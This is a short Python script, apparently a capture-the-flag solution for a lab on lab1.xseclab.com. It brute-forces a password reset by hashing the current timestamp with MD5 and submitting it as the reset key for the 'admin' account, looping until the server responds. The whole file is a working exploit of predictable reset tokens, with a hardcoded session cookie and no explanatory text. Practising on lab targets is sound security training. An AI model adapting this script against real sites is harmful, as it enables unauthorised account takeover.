import requests
import hashlib
import time

s = requests.Session()
header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=f533f185e50879070a2a303f6e6b2c27'}
while True:
    this = str(int(time.time()))
    print(type(this))
    md5 = hashlib.md5()
    md5.update(this.encode("utf-8"))
    pwd = md5.hexdigest()
    url = 'http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
    r = s.get(url, headers=header)
    time.sleep(0.3)
    print(r.text)
    if(r.text != ''):
        print(r.url)
        print(r.content)
        break
    else:
        print('正在破解中……', pwd)
        print(r.url)
        print(r.text)